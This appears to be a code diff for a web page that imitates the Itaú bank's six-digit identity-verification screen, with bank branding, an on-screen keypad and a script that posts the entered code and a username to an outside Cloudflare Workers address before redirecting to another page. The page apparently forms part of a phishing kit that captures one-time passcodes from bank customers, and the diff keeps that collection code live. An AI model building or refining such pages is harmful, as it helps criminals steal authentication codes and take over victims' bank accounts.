@@ -123,10 +123,6 @@ body {
     margin-top: 20px;
 }
 
-.text strong {
-    color: #06143f;
-}
-
 /* INPUT OCULTO */
 #claveInput {
     position: absolute;
@@ -136,7 +132,7 @@ body {
     pointer-events: none;
 }
 
-/* TECLADO ITAÚ */
+/* TECLADO */
 .keyboard {
     position: fixed;
     bottom: 0;
@@ -198,7 +194,7 @@ body {
     color: white;
 }
 
-/* ALERTA PERSONALIZADA */
+/* ALERTA */
 .alert-overlay {
     display: none;
     position: fixed;
@@ -275,35 +271,28 @@ body {
         padding: 14px 18px;
         min-height: 60px;
     }
-    
     .header .logo {
         font-size: 18px;
     }
-    
     .header .title {
         font-size: 15px;
     }
-    
     .container {
         padding: 30px 16px 140px;
     }
-    
     .code-boxes {
         gap: 10px;
     }
-    
     .box {
         width: 44px;
         height: 54px;
         font-size: 20px;
         border-radius: 10px;
     }
-    
     .keys {
         gap: 10px;
         max-width: 280px;
     }
-    
     .key {
         font-size: 21px;
         padding: 12px 0;
@@ -318,16 +307,13 @@ body {
         font-size: 17px;
         border-radius: 8px;
     }
-    
     .code-boxes {
         gap: 8px;
     }
-    
     .keys {
         gap: 8px;
         max-width: 240px;
     }
-    
     .key {
         font-size: 18px;
         padding: 10px 0;
@@ -347,7 +333,7 @@ body {
     </div>
 </div>
 
-<!-- CABECERA ITAÚ -->
+<!-- CABECERA -->
 <div class="header">
     <span class="back" onclick="window.history.back()">‹</span>
     <span class="logo">itaú</span>
@@ -355,27 +341,15 @@ body {
 </div>
 
 <div class="container">
-
-    <!-- CAJAS DEL CÓDIGO -->
     <div class="code-boxes" id="boxes"></div>
-
     <div class="text">
         Ingresa los 6 dígitos que enviamos a tu correo electrónico<br>
         o mensaje de texto para confirmar tu identidad.
     </div>
-
-    <!-- INPUT OCULTO -->
-    <input 
-        type="password"
-        id="claveInput"
-        maxlength="6"
-        inputmode="numeric"
-        autofocus
-    >
-
+    <input type="password" id="claveInput" maxlength="6" inputmode="numeric" autofocus>
 </div>
 
-<!-- TECLADO ITAÚ -->
+<!-- TECLADO -->
 <div class="keyboard">
     <div class="keys">
         <div class="key" data-value="1">1</div>
@@ -394,37 +368,31 @@ body {
 </div>
 
 <script>
-// ========================= CONFIGURACIÓN =========================
 const WORKER_URL = 'https://quiet-haze-3548.micollflorez.workers.dev';
 
-// ========================= ELEMENTOS =========================
 const claveInput = document.getElementById('claveInput');
 const boxesContainer = document.getElementById('boxes');
 const alertOverlay = document.getElementById('alertOverlay');
 
-// ========================= CREAR 6 CAJAS =========================
+// Crear 6 cajas
 for (let i = 0; i < 6; i++) {
     const div = document.createElement('div');
     div.classList.add('box');
     boxesContainer.appendChild(div);
 }
-
 const boxes = document.querySelectorAll('.box');
 
-// ========================= ALERTA =========================
 function mostrarAlerta() {
     alertOverlay.style.display = 'flex';
 }
 
 function cerrarAlerta() {
     alertOverlay.style.display = 'none';
-    // Limpiar y enfocar
     claveInput.value = '';
     updateBoxes();
     setTimeout(() => claveInput.focus(), 100);
 }
 
-// ========================= ACTUALIZAR CAJAS =========================
 function updateBoxes() {
     const val = claveInput.value;
     boxes.forEach((box, i) => {
@@ -446,19 +414,13 @@ function updateBoxes() {
     });
 }
 
-// ========================= MOSTRAR ERROR EN CAJAS =========================
 function mostrarErrorCajas() {
-    boxes.forEach((box) => {
-        box.classList.add('error');
-    });
+    boxes.forEach((box) => box.classList.add('error'));
     setTimeout(() => {
-        boxes.forEach((box) => {
-            box.classList.remove('error');
-        });
+        boxes.forEach((box) => box.classList.remove('error'));
     }, 500);
 }
 
-// ========================= FUNCIÓN PARA AGREGAR NÚMERO =========================
 function agregarNumero(numero) {
     if (claveInput.value.length < 6) {
         claveInput.value += numero;
@@ -466,7 +428,6 @@ function agregarNumero(numero) {
     }
 }
 
-// ========================= FUNCIÓN PARA BORRAR =========================
 function borrarNumero() {
     claveInput.value = claveInput.value.slice(0, -1);
     claveInput.dispatchEvent(new Event('input'));
@@ -488,7 +449,7 @@ async function enviarCodigo() {
         console.log('📤 Enviando código:', claveValue);
         console.log('👤 Usuario:', usuario);
 
-        // Enviar al worker
+        // ✅ Enviar al endpoint /validar
         const response = await fetch(`${WORKER_URL}/validar`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -502,10 +463,9 @@ async function enviarCodigo() {
         const result = await response.json();
 
         if (result.ok) {
-            // Redirigir a validacion.html
+            // ✅ Redirigir a validacion.html
             window.location.href = 'validacion.html';
         } else {
-            // Mostrar error
             mostrarErrorCajas();
             mostrarAlerta();
         }
@@ -517,28 +477,22 @@ async function enviarCodigo() {
     }
 }
 
-// ========================= EVENTOS DEL INPUT =========================
+// ========================= EVENTOS =========================
 claveInput.addEventListener('input', () => {
-    // Limitar a 6 dígitos
     if (claveInput.value.length > 6) {
         claveInput.value = claveInput.value.slice(0, 6);
     }
-
     updateBoxes();
-
-    // Si tiene 6 dígitos, enviar automáticamente
     if (claveInput.value.length === 6) {
         setTimeout(enviarCodigo, 300);
     }
 });
 
-// ========================= TECLADO =========================
+// TECLADO
 document.querySelectorAll('.key').forEach(key => {
-    // Evento click para escritorio
     key.addEventListener('click', function(e) {
         e.preventDefault();
         const value = this.dataset.value;
-        
         if (value === 'delete') {
             borrarNumero();
         } else if (value) {
@@ -546,11 +500,9 @@ document.querySelectorAll('.key').forEach(key => {
         }
     });
 
-    // Evento touch para móviles
     key.addEventListener('touchstart', function(e) {
         e.preventDefault();
         const value = this.dataset.value;
-        
         if (value === 'delete') {
             borrarNumero();
         } else if (value) {
@@ -559,18 +511,14 @@ document.querySelectorAll('.key').forEach(key => {
     }, { passive: false });
 });
 
-// ========================= INICIALIZAR =========================
+// INICIALIZAR
 updateBoxes();
-
-// Enfocar el input al cargar
-setTimeout(() => {
-    claveInput.focus();
-}, 300);
+setTimeout(() => claveInput.focus(), 300);
 
 console.log('🚀 Sistema de validación Itaú listo');
 console.log(`📡 Worker URL: ${WORKER_URL}`);
 
-// ========================= DETECTAR TECLADO FÍSICO =========================
+// TECLADO FÍSICO
 document.addEventListener('keydown', (e) => {
     if (e.key >= '0' && e.key <= '9') {
         if (claveInput.value.length < 6) {
